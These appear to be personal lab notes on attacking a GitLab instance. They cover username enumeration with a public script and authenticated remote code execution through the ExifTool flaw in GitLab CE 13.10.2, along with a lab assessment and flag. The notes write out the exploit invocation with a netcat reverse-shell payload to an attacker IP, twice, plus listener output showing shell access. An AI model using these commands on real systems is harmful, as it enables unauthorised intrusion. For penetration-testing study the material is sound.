# Attacking GitLab

## Username Enumeration

we should be mindful of account lockout and other kinds of interruptions. GitLab's defaults are set to 10 failed attempts resulting in an automatic unlock after 10 minutes.

admin can modify the minimum password length, which could help with users choosing short, common passwords but will not entirely mitigate the risk of password attacks.

{% embed url="https://www.exploit-db.com/exploits/49821" %}
User Enum bash
{% endembed %}

```shell-session
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  			             GitLab User Enumeration Script
   	    			             Version 1.0

Description: It prints out the usernames that exist in your victim's GitLab CE instance

Disclaimer: Do not run this script against GitLab.com! Also keep in mind that this PoC is meant only
for educational purpose and ethical use. Running it against systems that you do not own or have the
right permission is totally on your own risk.

Author: @4DoniiS [https://github.com/4D0niiS]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


LOOP
200
[+] The username root exists!
LOOP
302
LOOP
302
LOOP
200
[+] The username bob exists!
LOOP
302
```

## Authenticated Remote Code Execution

GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution [vulnerability](https://hackerone.com/reports/1154542) due to an issue with ExifTool handling metadata in uploaded image files.

some companies are still likely using a vulnerable version.

{% embed url="https://www.exploit-db.com/exploits/49951" %}
RCE
{% endembed %}

<pre class="language-shell-session"><code class="lang-shell-session"><strong>python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&#x26;1|nc 10.10.14.15 8443 >/tmp/f '
</strong>
[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
[+] RCE Triggered !!
</code></pre>

```shell-session
nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054

git@app04:~/gitlab-workhorse$ id

id
uid=996(git) gid=997(git) groups=997(git)

git@app04:~/gitlab-workhorse$ ls

ls
VERSION
config.toml
flag_gitlab.txt
sockets
```

## Assessment

Find another valid user on the target GitLab instance.

* Used .sh file to enumerate more than half an hour and got no new usernames
* DEMO

Gain remote code execution on the GitLab instance. Submit the flag in the directory you land in.

```
python3 rce.py -t http://gitlab.inlanefreight.local:8081 -u lky -p password -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.5 7890 >/tmp/f '
```

<figure><img src="../../../.gitbook/assets/image (21) (2).png" alt=""><figcaption></figcaption></figure>



